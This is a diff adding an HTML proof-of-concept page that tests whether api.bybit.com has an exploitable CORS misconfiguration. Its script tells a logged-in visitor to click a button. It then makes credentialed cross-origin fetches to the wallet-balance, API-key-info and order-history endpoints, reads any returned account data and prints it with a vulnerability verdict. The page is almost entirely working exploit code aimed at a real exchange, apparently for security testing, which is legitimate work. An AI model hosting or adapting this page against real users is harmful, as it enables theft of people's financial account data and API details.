@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>REAL CORS Test - Bybit</title>
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        .success { color: green; }
+        .error { color: red; }
+        .warning { color: orange; }
+        pre { background: #f0f0f0; padding: 10px; overflow: auto; }
+    </style>
+</head>
+<body>
+    <h1>🔍 REAL CORS Vulnerability Test</h1>
+    <p>This page attempts to read data from api.bybit.com using JavaScript fetch().</p>
+    <p><strong>Instructions:</strong></p>
+    <ol>
+        <li>Make sure you're logged into Bybit in another tab</li>
+        <li>Click the button below to test</li>
+        <li>Check if we can read your data</li>
+    </ol>
+    
+    <button onclick="testCORS()" style="padding: 10px 20px; font-size: 16px;">🚀 Test CORS Vulnerability</button>
+    
+    <div id="results"></div>
+    
+    <script>
+        async function testCORS() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<h2>Testing...</h2>';
+            
+            const tests = [
+                {
+                    name: 'Test 1: Public endpoint (no auth)',
+                    url: 'https://api.bybit.com/v5/market/time',
+                    needsAuth: false
+                },
+                {
+                    name: 'Test 2: Wallet Balance (SENSITIVE!)',
+                    url: 'https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED',
+                    needsAuth: true
+                },
+                {
+                    name: 'Test 3: User API Info (SENSITIVE!)',
+                    url: 'https://api.bybit.com/v5/user/query-api',
+                    needsAuth: true
+                },
+                {
+                    name: 'Test 4: Order History (SENSITIVE!)',
+                    url: 'https://api.bybit.com/v5/order/history?category=linear&limit=1',
+                    needsAuth: true
+                }
+            ];
+            
+            let vulnerabilityFound = false;
+            
+            for (const test of tests) {
+                results.innerHTML += `<h3>${test.name}</h3>`;
+                results.innerHTML += `<p>URL: <code>${test.url}</code></p>`;
+                
+                try {
+                    // Attempt to fetch with credentials
+                    const response = await fetch(test.url, {
+                        method: 'GET',
+                        credentials: 'include',  // This sends cookies/auth
+                        mode: 'cors'
+                    });
+                    
+                    results.innerHTML += `<p class="success">✅ Fetch succeeded! Status: ${response.status}</p>`;
+                    
+                    // Try to read response body
+                    try {
+                        const data = await response.json();
+                        
+                        // Check if we got actual data
+                        const retCode = data.retCode;
+                        
+                        if (retCode === 0) {
+                            // SUCCESS - We got real data!
+                            results.innerHTML += `<p class="error">🚨🚨🚨 CRITICAL: Got REAL DATA!</p>`;
+                            results.innerHTML += `<pre>${JSON.stringify(data, null, 2).substring(0, 500)}...</pre>`;
+                            vulnerabilityFound = true;
+                            
+                        } else if (retCode === 10001 || retCode === 10003) {
+                            // Auth required - expected for authenticated endpoints
+                            results.innerHTML += `<p class="warning">⚠️ Auth required (retCode: ${retCode}): ${data.retMsg}</p>`;
+                            if (test.needsAuth) {
+                                results.innerHTML += `<p>This is expected. The vulnerability would only work if you're logged in.</p>`;
+                            }
+                            
+                        } else {
+                            // Other error
+                            results.innerHTML += `<p class="warning">Got error code: ${retCode} - ${data.retMsg}</p>`;
+                        }
+                        
+                    } catch (parseError) {
+                        results.innerHTML += `<p class="error">❌ Could not parse JSON: ${parseError.message}</p>`;
+                    }
+                    
+                } catch (fetchError) {
+                    // CORS blocked or network error
+                    results.innerHTML += `<p class="error">❌ Fetch failed: ${fetchError.message}</p>`;
+                    
+                    if (fetchError.message.includes('CORS')) {
+                        results.innerHTML += `<p>✅ Good! Browser blocked CORS request.</p>`;
+                    }
+                }
+                
+                results.innerHTML += '<hr>';
+            }
+            
+            // Final verdict
+            results.innerHTML += '<h2>🎯 VERDICT</h2>';
+            if (vulnerabilityFound) {
+                results.innerHTML += `
+                    <p class="error" style="font-size: 20px;">
+                    🚨 VULNERABILITY CONFIRMED! 🚨<br>
+                    We successfully read sensitive data from api.bybit.com!<br>
+                    This is a REAL, EXPLOITABLE vulnerability!
+                    </p>`;
+            } else {
+                results.innerHTML += `
+                    <p class="success" style="font-size: 20px;">
+                    ✅ NO VULNERABILITY FOUND<br>
+                    Either:<br>
+                    1. You're not logged into Bybit (test authenticated endpoints won't work)<br>
+                    2. The CORS headers are present but browser blocks reading response<br>
+                    3. The vulnerability is NOT exploitable
+                    </p>`;
+            }
+        }
+        
+        // Log console for debugging
+        console.log('CORS Test Page Loaded');
+        console.log('This page will attempt to read data from api.bybit.com');
+        console.log('Click the button to start test');
+    </script>
+</body>
+</html>
